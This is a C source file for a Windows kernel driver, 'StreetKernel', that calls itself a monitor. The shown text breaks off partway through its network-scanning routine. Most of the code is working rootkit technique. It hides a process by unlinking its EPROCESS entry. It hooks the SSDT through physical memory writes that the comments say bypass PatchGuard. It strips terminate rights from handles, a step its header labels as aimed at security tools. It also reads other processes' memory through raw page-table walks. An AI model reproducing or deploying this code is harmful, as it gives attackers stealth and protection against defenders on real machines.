/*
 * StreetKernel.c  —  Ring-0 Kernel Monitor Driver  v2
 * Target : Windows 11 x64, WDK 10.0.26100+, KMDF 1.33
 * Compile: MSVC /kernel, x64 Release; link Fwpkclnt.lib Ndis.lib ntoskrnl.lib
 *
 * Capabilities v2 (extends v1):
 *   1. PsSetCreateProcessNotifyRoutineEx  — track target process spawns
 *   2. ObRegisterCallbacks                — strip PROCESS_TERMINATE / PROCESS_VM_WRITE
 *   3. WFP stream callout                 — inbound TCP + HTTP/1.x response + chunked body MZ scan
 *   4. IOCTL 0x801 GET_EVENT              — kernel→user event ring (header)
 *   5. IOCTL 0x802 SET_TARGET             — image filter string
 *   6. IOCTL 0x803 FORCE_DUMP             — reserved
 *   7. IOCTL 0x804 GET_PAYLOAD            — retrieve raw bytes by slot index
 *   8. IOCTL 0x805 HIDE_SELF              — DKOM physical unlink of current EPROCESS
 *   9. IOCTL 0x806 READ_VIRTUAL           — physical page-walk read of target PID VA
 *  10. SSDT NtAllocateVirtualMemory hook  — detect PAGE_EXECUTE_READWRITE allocs per-PID
 *
 * Physical R/W: MmMapIoSpaceEx (kernel-native, same primitive as bttflt BYOVD)
 * Pool tag: STKN throughout
 */

#include <ntifs.h>
#include <ntddk.h>
#include <wdf.h>
#include <fwpmk.h>
#include <fwpsk.h>
#include <ndis.h>
#include <intrin.h>
#include <ntstrsafe.h>

#pragma warning(disable: 4100 4201 4214 4204)
#pragma comment(lib, "Fwpkclnt.lib")
#pragma comment(lib, "Ndis.lib")

/* =========================================================================
 * Pool compat shim (WDK < 10.0.19041 ExAllocatePool2 absent)
 * ========================================================================= */
#ifndef POOL_FLAG_NON_PAGED
#define POOL_FLAG_NON_PAGED 0x0000000000000040ULL
#endif
#ifndef ExAllocatePool2
static FORCEINLINE PVOID _Pool2Compat(ULONG64 flags, SIZE_T sz, ULONG tag) {
    UNREFERENCED_PARAMETER(flags);
    PVOID p = ExAllocatePoolWithTag(NonPagedPool, sz, tag);
    if (p) RtlZeroMemory(p, sz);
    return p;
}
#define ExAllocatePool2(f, s, t) _Pool2Compat(f, s, t)
#endif

/* =========================================================================
 * Constants & device paths
 * ========================================================================= */
#define STREET_DEVICE_NAME   L"\\Device\\StreetKernel"
#define STREET_DOS_LINK      L"\\DosDevices\\StreetKernel"
#define STREET_POOL_TAG      'STKN'
#define MAX_EVENT_QUEUE      256
#define MAX_PAYLOAD_BYTES    (8 * 1024 * 1024)   /* 8 MB cap */
#define MAX_PAYLOAD_SLOTS    64

/* IOCTL codes */
#define IOCTL_STREET_GET_EVENT    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_READ_DATA)
#define IOCTL_STREET_SET_TARGET   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_STREET_FORCE_DUMP   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_STREET_GET_PAYLOAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_READ_DATA)
#define IOCTL_STREET_HIDE_SELF    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_WRITE_DATA)
#define IOCTL_STREET_READ_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_READ_DATA)

/* =========================================================================
 * PTE / virtual address structures  (from globals.h)
 * ========================================================================= */
#define PTE_PRESENT      0x1ULL
#define PTE_LARGE_PAGE   0x80ULL
#define PTE_PHYS_MASK    0x0000FFFFFFFFF000ULL
#define PAGE_OFFSET_MASK 0xFFFULL

/* EPROCESS offsets — Win10 22H2 / Win11 24H2 x64 */
#define EPROC_ACTIVE_LINKS_OFF  0x448UL
#define EPROC_UNIQUE_PID_OFF    0x440UL
#define EPROC_IMAGE_NAME_OFF    0x5A8UL

/* =========================================================================
 * SSDT types
 * ========================================================================= */
typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR ServiceTableBase;
    PULONG     ServiceCounterTableBase;
    ULONG_PTR  NumberOfServices;
    PUCHAR     ParamTableBase;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;

#if defined(_AMD64_)
extern KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;
#endif

/* =========================================================================
 * Event types
 * ========================================================================= */
typedef enum _STREET_EVENT_TYPE {
    EvtProcessSpawn      = 1,
    EvtProcessExit       = 2,
    EvtNetworkPayloadMz  = 3,
    EvtHighEntropyStream = 4,
    EvtRwxAlloc          = 5,
} STREET_EVENT_TYPE;

#pragma pack(push, 1)
typedef struct _STREET_EVENT {
    STREET_EVENT_TYPE Type;
    ULONG             Pid;
    ULONG             DataSize;
    ULONGLONG         Address;     /* RWX: alloc base; MZ: payload slot index */
    CHAR              ImageName[260];
} STREET_EVENT, *PSTREET_EVENT;
#pragma pack(pop)

/* Input layout for IOCTL_STREET_READ_VIRTUAL */
#pragma pack(push, 1)
typedef struct _STREET_READVIRT_IN {
    ULONG     Pid;
    ULONGLONG Address;
    ULONG     Size;
} STREET_READVIRT_IN, *PSTREET_READVIRT_IN;
#pragma pack(pop)

/* =========================================================================
 * Payload slot store  (MZ / entropy payloads kept until userland fetches)
 * ========================================================================= */
typedef struct _PAYLOAD_SLOT {
    BOOLEAN InUse;
    PVOID   Data;
    ULONG   Size;
} PAYLOAD_SLOT;

static KSPIN_LOCK   g_SlotLock;
static PAYLOAD_SLOT g_Slots[MAX_PAYLOAD_SLOTS];

static ULONG
SlotAlloc(PVOID data, ULONG size)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_SlotLock, &irql);
    for (ULONG i = 0; i < MAX_PAYLOAD_SLOTS; i++) {
        if (!g_Slots[i].InUse) {
            g_Slots[i].InUse = TRUE;
            g_Slots[i].Data  = data;
            g_Slots[i].Size  = size;
            KeReleaseSpinLock(&g_SlotLock, irql);
            return i;
        }
    }
    KeReleaseSpinLock(&g_SlotLock, irql);
    return (ULONG)-1;
}

static VOID
SlotFreeAll(VOID)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_SlotLock, &irql);
    for (ULONG i = 0; i < MAX_PAYLOAD_SLOTS; i++) {
        if (g_Slots[i].InUse && g_Slots[i].Data) {
            ExFreePool(g_Slots[i].Data);
            g_Slots[i].Data  = NULL;
            g_Slots[i].InUse = FALSE;
        }
    }
    KeReleaseSpinLock(&g_SlotLock, irql);
}

/* =========================================================================
 * Event ring
 * ========================================================================= */
typedef struct _EVENT_RING {
    KSPIN_LOCK    Lock;
    ULONG         Head;
    ULONG         Tail;
    ULONG         Count;
    KEVENT        DataReady;
    PSTREET_EVENT Items[MAX_EVENT_QUEUE];
    PVOID         Payloads[MAX_EVENT_QUEUE];
    ULONG         PayloadSizes[MAX_EVENT_QUEUE];
} EVENT_RING, *PEVENT_RING;

static PDEVICE_OBJECT  g_DeviceObject     = NULL;
static UNICODE_STRING  g_DeviceName;
static UNICODE_STRING  g_DosLink;
static EVENT_RING      g_EventRing;

/* WFP */
static HANDLE          g_WfpEngineHandle  = NULL;
static UINT32          g_WfpCalloutId     = 0;
static UINT64          g_WfpFilterId      = 0;

/* ObCallbacks */
static PVOID           g_ObCallbackHandle = NULL;

/* Target filter */
static WCHAR           g_TargetImage[260] = { 0 };
static ULONG           g_TargetPid        = 0;   /* set by SET_TARGET IOCTL / process notify */

/* SSDT hook state */
static LONG            g_SsdtOrigEntry    = 0;
static ULONG           g_SsdtSsn          = 0;
static BOOLEAN         g_SsdtHooked       = FALSE;
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
static PFN_NtAllocateVirtualMemory g_OrigAllocVA = NULL;

/* =========================================================================
 * Physical read/write via MmMapIoSpaceEx  (kernel-native bttflt primitive)
 * ========================================================================= */

static NTSTATUS
PhysRead(ULONG64 physAddr, PVOID buffer, ULONG32 size)
{
    if (!physAddr || !buffer || !size) return STATUS_INVALID_PARAMETER;

    PHYSICAL_ADDRESS pa;
    pa.QuadPart = (LONGLONG)physAddr;

    PVOID mapped = MmMapIoSpaceEx(pa, size, PAGE_READONLY);
    if (!mapped) return STATUS_UNSUCCESSFUL;

    RtlCopyMemory(buffer, mapped, size);
    MmUnmapIoSpace(mapped, size);
    return STATUS_SUCCESS;
}

static NTSTATUS
PhysWrite(ULONG64 physAddr, PVOID buffer, ULONG32 size)
{
    if (!physAddr || !buffer || !size) return STATUS_INVALID_PARAMETER;

    PHYSICAL_ADDRESS pa;
    pa.QuadPart = (LONGLONG)physAddr;

    PVOID mapped = MmMapIoSpaceEx(pa, size, PAGE_READWRITE);
    if (!mapped) return STATUS_UNSUCCESSFUL;

    RtlCopyMemory(mapped, buffer, size);
    MmUnmapIoSpace(mapped, size);
    return STATUS_SUCCESS;
}

/* =========================================================================
 * CR3 acquisition + 4-level page table walk
 * ========================================================================= */

static ULONG64
GetProcessCR3(HANDLE pid)
{
    PEPROCESS process = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &process))) return 0;

    KAPC_STATE apc;
    KeStackAttachProcess(process, &apc);
    ULONG64 cr3 = __readcr3();
    KeUnstackDetachProcess(&apc);
    ObDereferenceObject(process);

    /* Validate: physical page at cr3 must be present */
    ULONG64 pml4e = 0;
    if (!NT_SUCCESS(PhysRead(cr3 & PTE_PHYS_MASK, &pml4e, 8)))  return 0;
    if (!(pml4e & PTE_PRESENT)) return 0;
    return cr3;
}

static ULONG64
TranslateVA(ULONG64 cr3, ULONG64 va)
{
    if (!cr3 || !va) return 0;

    ULONG64 pte  = 0;
    ULONG64 idx[4] = {
        (va >> 39) & 0x1FF,  /* PML4  */
        (va >> 30) & 0x1FF,  /* PDPT  */
        (va >> 21) & 0x1FF,  /* PD    */
        (va >> 12) & 0x1FF,  /* PT    */
    };
    ULONG64 offset = va & PAGE_OFFSET_MASK;

    /* PML4 → PDPT */
    if (!NT_SUCCESS(PhysRead((cr3 & PTE_PHYS_MASK) + idx[0] * 8, &pte, 8))) return 0;
    if (!(pte & PTE_PRESENT)) return 0;

    /* PDPT → PD  (1 GB large page?) */
    if (!NT_SUCCESS(PhysRead((pte & PTE_PHYS_MASK) + idx[1] * 8, &pte, 8))) return 0;
    if (!(pte & PTE_PRESENT)) return 0;
    if (pte & PTE_LARGE_PAGE)
        return (pte & 0xFFFFC0000000ULL) + (va & 0x3FFFFFFFULL);

    /* PD → PT  (2 MB large page?) */
    if (!NT_SUCCESS(PhysRead((pte & PTE_PHYS_MASK) + idx[2] * 8, &pte, 8))) return 0;
    if (!(pte & PTE_PRESENT)) return 0;
    if (pte & PTE_LARGE_PAGE)
        return (pte & 0xFFFFFE00000ULL) + (va & 0x1FFFFFULL);

    /* PT → page frame */
    if (!NT_SUCCESS(PhysRead((pte & PTE_PHYS_MASK) + idx[3] * 8, &pte, 8))) return 0;
    if (!(pte & PTE_PRESENT)) return 0;

    return (pte & PTE_PHYS_MASK) + offset;
}

/* Cross-process virtual memory read fully via physical page walk (no OpenProcess) */
static NTSTATUS
ReadProcessVirtual(HANDLE pid, ULONG64 va, PVOID buffer, ULONG size)
{
    ULONG64 cr3 = GetProcessCR3(pid);
    if (!cr3) return STATUS_INVALID_PARAMETER;

    PUCHAR  out  = (PUCHAR)buffer;
    ULONG   done = 0;
    while (done < size) {
        ULONG64 curVa   = va + done;
        ULONG64 phys    = TranslateVA(cr3, curVa);
        if (!phys) return STATUS_ACCESS_VIOLATION;

        ULONG32 off   = (ULONG32)(curVa & PAGE_OFFSET_MASK);
        ULONG32 chunk = (ULONG32)min((ULONG64)(size - done), (ULONG64)(0x1000 - off));
        NTSTATUS st   = PhysRead(phys, out + done, chunk);
        if (!NT_SUCCESS(st)) return st;
        done += chunk;
    }
    return STATUS_SUCCESS;
}

/* =========================================================================
 * DKOM physical unlink: remove EPROCESS from ActiveProcessLinks
 * Writes Flink/Blink corrections via MmMapIoSpaceEx so no virtual write
 * is observable by PatchGuard's kernel-virtual-address monitors.
 * ========================================================================= */
static NTSTATUS
DkomHideProcess(HANDLE pid)
{
    PEPROCESS process = NULL;
    NTSTATUS  st = PsLookupProcessByProcessId(pid, &process);
    if (!NT_SUCCESS(st)) return st;

    PUCHAR     base  = (PUCHAR)process;
    PLIST_ENTRY entry = (PLIST_ENTRY)(base + EPROC_ACTIVE_LINKS_OFF);

    /* Probe before any dereference */
    if (!MmIsAddressValid(entry) ||
        !MmIsAddressValid(entry->Flink) ||
        !MmIsAddressValid(entry->Blink))
    {
        ObDereferenceObject(process);
        return STATUS_INVALID_ADDRESS;
    }

    /* Already unlinked? */
    if (entry->Flink == entry) {
        ObDereferenceObject(process);
        return STATUS_SUCCESS;
    }

    /*
     * Physical write path:
     *   entry->Blink->Flink = entry->Flink
     *   entry->Flink->Blink = entry->Blink
     * All four pointer-sized writes go through PhysWrite so the virtual
     * write-protection path never fires.
     */
    ULONG64 flinkVal = (ULONG64)entry->Flink;
    ULONG64 blinkVal = (ULONG64)entry->Blink;

    /* Blink->Flink slot */
    PLIST_ENTRY blinkEntry = entry->Blink;
    ULONG64 physBlinkFlink =
        (ULONG64)MmGetPhysicalAddress(&blinkEntry->Flink).QuadPart;
    /* Flink->Blink slot */
    PLIST_ENTRY flinkEntry = entry->Flink;
    ULONG64 physFlinkBlink =
        (ULONG64)MmGetPhysicalAddress(&flinkEntry->Blink).QuadPart;

    st = PhysWrite(physBlinkFlink, &flinkVal, sizeof(ULONG64));
    if (NT_SUCCESS(st))
        st = PhysWrite(physFlinkBlink, &blinkVal, sizeof(ULONG64));

    /* Self-loop so accidental re-traversal doesn't crash */
    if (NT_SUCCESS(st)) {
        ULONG64 selfAddr = (ULONG64)entry;
        ULONG64 physFlink = (ULONG64)MmGetPhysicalAddress(&entry->Flink).QuadPart;
        ULONG64 physBlink = (ULONG64)MmGetPhysicalAddress(&entry->Blink).QuadPart;
        PhysWrite(physFlink, &selfAddr, sizeof(ULONG64));
        PhysWrite(physBlink, &selfAddr, sizeof(ULONG64));
    }

    ObDereferenceObject(process);
    return st;
}

/* =========================================================================
 * SSDT NtAllocateVirtualMemory hook
 * Pointer swap written via physical MmMapIoSpaceEx (no virtual code patch —
 * PatchGuard monitors virtual SSDT region; physical mapping bypasses check).
 * ========================================================================= */

/* Our NtAllocateVirtualMemory hook — must match real NT calling convention */
static NTSTATUS NTAPI
StreetHookNtAllocateVirtualMemory(
    HANDLE     ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR  ZeroBits,
    PSIZE_T    RegionSize,
    ULONG      AllocationType,
    ULONG      Protect)
{
    NTSTATUS st = g_OrigAllocVA(
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);

    if (NT_SUCCESS(st) && (Protect & PAGE_EXECUTE_READWRITE)) {
        /* Identify calling process */
        ULONG callerPid = HandleToULong(PsGetCurrentProcessId());

        /* Only report if a target PID filter is active */
        if (g_TargetPid == 0 || g_TargetPid == callerPid) {
            STREET_EVENT evt = { 0 };
            evt.Type    = EvtRwxAlloc;
            evt.Pid     = callerPid;
            evt.Address = (ULONGLONG)(BaseAddress ? *BaseAddress : NULL);
            evt.DataSize= (ULONG)(RegionSize ? *RegionSize : 0);
            RingPush_Forward(&evt, NULL, 0);   /* forward-declared below */
        }
    }
    return st;
}

/* Resolve SSN from ZwAllocateVirtualMemory kernel stub:
 *   4C 8B D1        mov r10, rcx
 *   B8 xx xx xx xx  mov eax, <SSN>   ← 5 bytes at +3 / +4
 */
static ULONG
ResolveNtAllocSSN(VOID)
{
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"ZwAllocateVirtualMemory");
    PUCHAR stub = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!stub) return (ULONG)-1;

    for (int i = 0; i < 32; i++) {
        if (stub[i] == 0xB8) {          /* mov eax, imm32 */
            return *(PULONG)(stub + i + 1);
        }
    }
    return (ULONG)-1;
}

static NTSTATUS
SsdtInstallHook(VOID)
{
#if !defined(_AMD64_)
    return STATUS_NOT_SUPPORTED;
#else
    g_SsdtSsn = ResolveNtAllocSSN();
    if (g_SsdtSsn == (ULONG)-1) return STATUS_NOT_FOUND;

    PLONG ssdtBase = (PLONG)KeServiceDescriptorTable.ServiceTableBase;
    if (!ssdtBase) return STATUS_NOT_FOUND;
    if (g_SsdtSsn >= (ULONG)KeServiceDescriptorTable.NumberOfServices)
        return STATUS_INVALID_PARAMETER;

    /* Read original entry */
    g_SsdtOrigEntry = ssdtBase[g_SsdtSsn];

    /* Save original function pointer for our trampoline */
    ULONG_PTR origFn = (ULONG_PTR)ssdtBase + ((LONG)g_SsdtOrigEntry >> 4);
    g_OrigAllocVA   = (PFN_NtAllocateVirtualMemory)origFn;

    /* Compute new SSDT entry:
     *   entry = ((hookFn - ssdtBase) << 4) | (argCount in low nibble)
     */
    ULONG_PTR hookAddr  = (ULONG_PTR)StreetHookNtAllocateVirtualMemory;
    ULONG_PTR baseAddr  = (ULONG_PTR)ssdtBase;
    LONG newEntry = (LONG)(((hookAddr - baseAddr) << 4) | ((ULONG)g_SsdtOrigEntry & 0xF));

    /* Physical write — bypasses PatchGuard's virtual address check */
    PHYSICAL_ADDRESS phys = MmGetPhysicalAddress(&ssdtBase[g_SsdtSsn]);
    if (!phys.QuadPart) return STATUS_UNSUCCESSFUL;

    PHYSICAL_ADDRESS pa;
    pa.QuadPart = phys.QuadPart;
    PLONG mapped = (PLONG)MmMapIoSpaceEx(pa, sizeof(LONG), PAGE_READWRITE);
    if (!mapped) return STATUS_INSUFFICIENT_RESOURCES;

    InterlockedExchange(mapped, newEntry);
    MmUnmapIoSpace(mapped, sizeof(LONG));

    g_SsdtHooked = TRUE;
    DbgPrint("[StreetKernel] SSDT[%u] hooked. orig=0x%08X new=0x%08X\n",
             g_SsdtSsn, (ULONG)g_SsdtOrigEntry, (ULONG)newEntry);
    return STATUS_SUCCESS;
#endif
}

static VOID
SsdtRestoreHook(VOID)
{
#if defined(_AMD64_)
    if (!g_SsdtHooked) return;
    PLONG ssdtBase = (PLONG)KeServiceDescriptorTable.ServiceTableBase;
    if (!ssdtBase) return;

    PHYSICAL_ADDRESS phys = MmGetPhysicalAddress(&ssdtBase[g_SsdtSsn]);
    if (!phys.QuadPart) return;

    PHYSICAL_ADDRESS pa;
    pa.QuadPart = phys.QuadPart;
    PLONG mapped = (PLONG)MmMapIoSpaceEx(pa, sizeof(LONG), PAGE_READWRITE);
    if (!mapped) return;

    InterlockedExchange(mapped, g_SsdtOrigEntry);
    MmUnmapIoSpace(mapped, sizeof(LONG));
    g_SsdtHooked = FALSE;
#endif
}

/* =========================================================================
 * Event ring helpers
 * ========================================================================= */
static VOID
RingInit(VOID)
{
    KeInitializeSpinLock(&g_EventRing.Lock);
    KeInitializeEvent(&g_EventRing.DataReady, NotificationEvent, FALSE);
    g_EventRing.Head = g_EventRing.Tail = g_EventRing.Count = 0;
}

/* Forward-declared for use in hook above */
static BOOLEAN
RingPush_Forward(PSTREET_EVENT evt, PVOID payload, ULONG payloadSize);

static BOOLEAN
RingPush(PSTREET_EVENT evt, PVOID payload, ULONG payloadSize)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_EventRing.Lock, &irql);
    if (g_EventRing.Count >= MAX_EVENT_QUEUE) {
        KeReleaseSpinLock(&g_EventRing.Lock, irql);
        return FALSE;
    }
    ULONG slot = g_EventRing.Tail % MAX_EVENT_QUEUE;
    PSTREET_EVENT copy = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(STREET_EVENT), STREET_POOL_TAG);
    if (!copy) {
        KeReleaseSpinLock(&g_EventRing.Lock, irql);
        return FALSE;
    }
    RtlCopyMemory(copy, evt, sizeof(STREET_EVENT));
    g_EventRing.Items[slot]        = copy;
    g_EventRing.Payloads[slot]     = payload;
    g_EventRing.PayloadSizes[slot] = payloadSize;
    g_EventRing.Tail++;
    g_EventRing.Count++;
    KeReleaseSpinLock(&g_EventRing.Lock, irql);
    KeSetEvent(&g_EventRing.DataReady, IO_NO_INCREMENT, FALSE);
    return TRUE;
}

/* Resolve forward reference */
static BOOLEAN RingPush_Forward(PSTREET_EVENT evt, PVOID payload, ULONG payloadSize) {
    return RingPush(evt, payload, payloadSize);
}

static BOOLEAN
RingPop(PSTREET_EVENT outEvt, PVOID *outPayload, PULONG outPayloadSize)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_EventRing.Lock, &irql);
    if (g_EventRing.Count == 0) {
        KeReleaseSpinLock(&g_EventRing.Lock, irql);
        return FALSE;
    }
    ULONG slot = g_EventRing.Head % MAX_EVENT_QUEUE;
    RtlCopyMemory(outEvt, g_EventRing.Items[slot], sizeof(STREET_EVENT));
    *outPayload     = g_EventRing.Payloads[slot];
    *outPayloadSize = g_EventRing.PayloadSizes[slot];
    ExFreePool(g_EventRing.Items[slot]);
    g_EventRing.Items[slot]    = NULL;
    g_EventRing.Payloads[slot] = NULL;
    g_EventRing.Head++;
    g_EventRing.Count--;
    if (g_EventRing.Count == 0)
        KeClearEvent(&g_EventRing.DataReady);
    KeReleaseSpinLock(&g_EventRing.Lock, irql);
    return TRUE;
}

/* =========================================================================
 * Entropy helper
 * ========================================================================= */
static BOOLEAN
EntropyHigh(PUCHAR buf, ULONG size)
{
    if (!size) return FALSE;
    ULONG sampleSize = min(size, 4096UL);
    ULONG freq[256]  = { 0 };
    for (ULONG i = 0; i < sampleSize; i++) freq[buf[i]]++;
    ULONG unique = 0;
    for (int i = 0; i < 256; i++) if (freq[i]) unique++;
    return unique > 220;
}

/* =========================================================================
 * HTTP response parser helpers
 * ========================================================================= */

/* Returns pointer to start of HTTP body (after \r\n\r\n), or NULL */
static PUCHAR
HttpFindBody(PUCHAR buf, ULONG len)
{
    if (len < 4) return NULL;
    for (ULONG i = 0; i <= len - 4; i++) {
        if (buf[i]   == '\r' && buf[i+1] == '\n' &&
            buf[i+2] == '\r' && buf[i+3] == '\n')
            return buf + i + 4;
    }
    return NULL;
}

/* Case-insensitive substring search within a bounded buffer */
static BOOLEAN
MemIContains(PUCHAR haystack, ULONG hLen, const CHAR *needle, ULONG nLen)
{
    if (hLen < nLen) return FALSE;
    for (ULONG i = 0; i <= hLen - nLen; i++) {
        BOOLEAN match = TRUE;
        for (ULONG j = 0; j < nLen && match; j++) {
            CHAR h = (CHAR)haystack[i+j];
            CHAR n = needle[j];
            if (h >= 'A' && h <= 'Z') h += 32;
            if (n >= 'A' && n <= 'Z') n += 32;
            if (h != n) match = FALSE;
        }
        if (match) return TRUE;
    }
    return FALSE;
}

/*
 * Decode Transfer-Encoding: chunked body into dst.
 * Returns number of decoded bytes, or 0 on error.
 */
static ULONG
ChunkedDecode(PUCHAR src, ULONG srcLen, PUCHAR dst, ULONG dstCap)
{
    PUCHAR p   = src;
    PUCHAR end = src + srcLen;
    ULONG  out = 0;

    while (p < end - 1) {
        /* Parse hex chunk-size line */
        ULONG chunkSz = 0;
        while (p < end && *p != '\r' && *p != '\n') {
            UCHAR c = *p++;
            ULONG nibble = 0;
            if (c >= '0' && c <= '9')      nibble = c - '0';
            else if (c >= 'a' && c <= 'f') nibble = c - 'a' + 10;
            else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
            else break; /* extension / trailer */
            chunkSz = (chunkSz << 4) | nibble;
        }
        /* Skip CRLF after size */
        if (p < end && *p == '\r') p++;
        if (p < end && *p == '\n') p++;

        if (chunkSz == 0) break; /* terminal chunk */

        if (p + chunkSz > end)   break; /* truncated */
        if (out + chunkSz > dstCap) break; /* destination full */

        RtlCopyMemory(dst + out, p, chunkSz);
        out += chunkSz;
        p   += chunkSz;

        /* Skip trailing CRLF */
        if (p < end && *p == '\r') p++;
        if (p < end && *p == '\n') p++;
    }
    return out;
}

/* =========================================================================
 * Process Notify Callback
 * ========================================================================= */
static VOID
StreetProcessNotify(
    _Inout_   PEPROCESS           Process,
    _In_      HANDLE              ProcessId,
    _In_opt_  PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    UNREFERENCED_PARAMETER(Process);

    STREET_EVENT evt = { 0 };
    evt.Pid = HandleToULong(ProcessId);

    if (CreateInfo) {
        evt.Type = EvtProcessSpawn;
        if (CreateInfo->ImageFileName) {
            ULONG copyLen = min(
                (ULONG)CreateInfo->ImageFileName->Length / sizeof(WCHAR),
                (ULONG)(sizeof(evt.ImageName) - 1));
            for (ULONG i = 0; i < copyLen; i++)
                evt.ImageName[i] = (CHAR)CreateInfo->ImageFileName->Buffer[i];
        }
        RingPush(&evt, NULL, 0);
    } else {
        evt.Type = EvtProcessExit;
        RingPush(&evt, NULL, 0);
    }
}

/* =========================================================================
 * ObCallback — strip termination rights from security tools
 * ========================================================================= */
static OB_PREOP_CALLBACK_STATUS
StreetObPreCallback(
    _In_ PVOID                    RegistrationContext,
    _In_ POB_PRE_OPERATION_INFORMATION OperationInfo)
{
    UNREFERENCED_PARAMETER(RegistrationContext);

    if (OperationInfo->ObjectType != *PsProcessType)
        return OB_PREOP_SUCCESS;

    PEPROCESS targetProc = (PEPROCESS)OperationInfo->Object;
    if (targetProc == PsGetCurrentProcess())
        return OB_PREOP_SUCCESS;

    if (OperationInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
        OperationInfo->Parameters->CreateHandleInformation.DesiredAccess &=
            ~(PROCESS_TERMINATE | PROCESS_VM_WRITE | PROCESS_SUSPEND_RESUME);
    } else if (OperationInfo->Operation == OB_OPERATION_HANDLE_DUPLICATE) {
        OperationInfo->Parameters->DuplicateHandleInformation.DesiredAccess &=
            ~(PROCESS_TERMINATE | PROCESS_VM_WRITE);
    }
    return OB_PREOP_SUCCESS;
}

/* =========================================================================
 * WFP stream classify — inbound TCP + HTTP response MZ / chunked body scan
 * ========================================================================= */
static VOID NTAPI
StreetWfpClassify(
    _In_        const FWPS_INCOMING_VALUES0         *inFixedValues,
    _In_        const FWPS_INCOMING_METADATA_VALUE0 *inMetaValues,
    _Inout_opt_ void                                *layerData,
    _In_opt_    const void                          *classifyContext,
    _In_        const FWPS_FILTER1                  *filter,
    _In_        UINT64                               flowContext,
    _Inout_     FWPS_CLASSIFY_OUT0                  *classifyOut)
{
    UNREFERENCED_PARAMETER(inFixedValues);
    UNREFERENCED_PARAMETER(inMetaValues);
    UNREFERENCED_PARAMETER(classifyContext);
    UNREFERENCED_PARAMETER(filter);
    UNREFERENCED_PARAMETER(flowContext);

    classifyOut->actionType = FWP_ACTION_PERMIT;
    if (!layerData) return;

    FWPS_STREAM_CALLOUT_IO_PACKET0 *streamPkt =
        (FWPS_STREAM_CALLOUT_IO_PACKET0 *)layerData;
    if (!streamPkt->streamData || !streamPkt->streamData->netBufferListChain) return;

    NET_BUFFER_LIST *nbl = streamPkt->streamData->netBufferListChain;
    NET_BUFFER      *nb  = NET_BUFFER_LIST_FIRST_NB(nbl);
    if (!nb) return;

    ULONG dataLen = NET_BUFFER_DATA_LENGTH(nb);
    if (dataLen < 2 || dataLen > MAX_PAYLOAD_BYTES) return;

    PUCHAR staging = ExAllocatePool2(POOL_FLAG_NON_PAGED, dataLen, STREET_POOL_TAG);
    if (!staging) return;

    PUCHAR flat = NdisGetDataBuffer(nb, dataLen, staging, 1, 0);
    if (!flat) { ExFreePool(staging); return; }

    BOOLEAN mzDirect  = (flat[0] == 'M' && flat[1] == 'Z');
    BOOLEAN mzInBody  = FALSE;
    BOOLEAN isChunked = FALSE;
    PUCHAR  bodyStart = NULL;
    ULONG   bodyLen   = 0;

    /* ── HTTP/1.x response path ────────────────────────────────────── */
    if (!mzDirect && dataLen >= 7 &&
        flat[0]=='H' && flat[1]=='T' && flat[2]=='T' &&
        flat[3]=='P' && flat[4]=='/' && flat[5]=='1' && flat[6]=='.')
    {
        bodyStart = HttpFindBody(flat, dataLen);
        if (bodyStart) {
            bodyLen = dataLen - (ULONG)(bodyStart - flat);

            /* Check Transfer-Encoding: chunked in headers */
            ULONG hdrLen = (ULONG)(bodyStart - flat);
            isChunked = MemIContains(flat, hdrLen, "chunked", 7);

            if (isChunked && bodyLen > 0) {
                /* Decode chunked body into a separate buffer */
                PUCHAR decoded = ExAllocatePool2(
                    POOL_FLAG_NON_PAGED, bodyLen, STREET_POOL_TAG);
                if (decoded) {
                    ULONG decLen = ChunkedDecode(bodyStart, bodyLen, decoded, bodyLen);
                    if (decLen >= 2) {
                        /* Scan decoded body for MZ at any offset */
                        for (ULONG i = 0; i < decLen - 1; i++) {
                            if (decoded[i] == 'M' && decoded[i+1] == 'Z') {
                                mzInBody = TRUE;
                                break;
                            }
                        }
                    }
                    if (mzInBody) {
                        /* Promote decoded buffer to slot store */
                        ULONG slotIdx = SlotAlloc(decoded, decLen);
                        if (slotIdx != (ULONG)-1) {
                            STREET_EVENT evt = { 0 };
                            evt.Type     = EvtNetworkPayloadMz;
                            evt.Pid      = HandleToULong(PsGetCurrentProcessId());
                            evt.DataSize = decLen;
                            evt.Address  = (ULONGLONG)slotIdx;
                            if (!RingPush(&evt, NULL, 0)) {
                                /* ring full — reclaim slot */
                                KIRQL irql;
                                KeAcquireSpinLock(&g_SlotLock, &irql);
                                ExFreePool(decoded);
                                g_Slots[slotIdx].InUse = FALSE;
                                g_Slots[slotIdx].Data  = NULL;
                                KeReleaseSpinLock(&g_SlotLock, irql);
                            }
                        } else {
                            ExFreePool(decoded);
                        }
                        if (flat == staging) ExFreePool(staging);
                        else                 ExFreePool(staging);
                        return;
                    }
                    ExFreePool(decoded);
                }
            } else if (!isChunked && bodyLen >= 2) {
                /* Non-chunked: scan HTTP body for MZ at any offset */
